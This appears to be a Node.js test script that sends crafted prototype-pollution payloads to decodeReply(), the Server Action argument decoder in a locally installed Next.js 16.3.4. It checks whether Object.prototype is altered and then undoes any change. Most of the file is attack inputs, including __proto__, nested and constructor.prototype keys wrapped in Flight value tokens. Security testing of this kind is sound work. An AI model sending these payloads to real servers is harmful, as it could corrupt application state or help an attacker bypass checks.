/**
 * Prototype-pollution battery against decodeReply() -- the Server Action
 * ARGUMENT decoder -- in next@16.3.4's vendored react-server-dom-webpack.
 *
 * Run: NODE_ENV=production node --conditions=react-server t_flight_pollute.mjs
 */
import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)

const { decodeReply } = require(
  '/home/user/nextlab/node_modules/next/dist/compiled/react-server-dom-webpack/server.node.js'
)

const manifest = {}
const SENTINELS = ['polluted', 'isAdmin', 'id', 'chunks', 'name', 'then']

function snapshot() {
  const o = {}
  for (const k of SENTINELS) o[k] = Object.prototype[k]
  return o
}

function diff(before) {
  const changed = []
  for (const k of SENTINELS) {
    if (Object.prototype[k] !== before[k]) changed.push(k)
  }
  return changed
}

async function attempt(label, rootJson, extraFields = {}) {
  const before = snapshot()
  const fd = new FormData()
  fd.append('0', rootJson)
  for (const [k, v] of Object.entries(extraFields)) {
    fd.append(k, v instanceof Uint8Array ? new Blob([v]) : v)
  }
  let outcome
  try {
    const args = await decodeReply(fd, manifest)
    const a = args && args[0]
    const protoReplaced =
      a && typeof a === 'object' && Object.getPrototypeOf(a) !== Object.prototype
    outcome =
      `ok  keys=${a && typeof a === 'object' ? JSON.stringify(Object.keys(a)) : typeof a}` +
      (protoReplaced ? '  *** PROTOTYPE REPLACED ***' : '')
  } catch (e) {
    outcome = 'threw: ' + String(e.message).slice(0, 70)
  }
  const changed = diff(before)
  const verdict = changed.length ? `*** POLLUTED: ${changed.join(',')} ***` : 'clean'
  console.log(`  ${label.padEnd(46)} ${verdict.padEnd(24)} ${outcome}`)
  // undo anything that did land, so cases stay independent
  for (const k of changed) delete Object.prototype[k]
}

console.log('next:', require('/home/user/nextlab/node_modules/next/package.json').version)
console.log('\nprototype-pollution attempts through decodeReply:\n')

const bytes = new Uint8Array([65, 66, 67, 68])

// direct __proto__ keys, every value-token shape
await attempt('__proto__ -> Uint8Array ($o)', '[{"__proto__":"$o1"}]', { 1: bytes })
await attempt('__proto__ -> ArrayBuffer ($A)', '[{"__proto__":"$A1"}]', { 1: bytes })
await attempt('__proto__ -> DataView ($V)', '[{"__proto__":"$V1"}]', { 1: bytes })
await attempt('__proto__ -> outlined model ($)', '[{"__proto__":"$1"}]', { 1: '{"polluted":1}' })
await attempt('__proto__ -> plain object', '[{"__proto__":{"polluted":1}}]')
await attempt('__proto__ -> Map ($Q)', '[{"__proto__":"$Q1"}]', { 1: '[["polluted",1]]' })
await attempt('__proto__ -> Date ($D)', '[{"__proto__":"$D2024-01-01"}]')

// nested one level down (the delete is in the recursive walk)
await attempt('nested a.__proto__ -> Uint8Array', '[{"a":{"__proto__":"$o1"}}]', { 1: bytes })
await attempt('nested twice', '[{"a":{"b":{"__proto__":"$o1"}}}]', { 1: bytes })

// inside an array element
await attempt('array elem __proto__', '[[{"__proto__":"$o1"}]]', { 1: bytes })

// constructor / prototype chain instead of __proto__
await attempt('constructor.prototype', '[{"constructor":{"prototype":{"polluted":1}}}]')
await attempt('constructor -> Uint8Array', '[{"constructor":"$o1"}]', { 1: bytes })

// the outlined-model root itself keyed as __proto__
await attempt('outlined root is __proto__ holder', '[{"x":"$1"}]', { 1: '{"__proto__":{"polluted":1}}' })

// FormData ($K) and Set ($W) containers
await attempt('__proto__ -> Set ($W)', '[{"__proto__":"$W1"}]', { 1: '["polluted"]' })

console.log('\nfinal Object.prototype sentinels:',
  JSON.stringify(snapshot()))
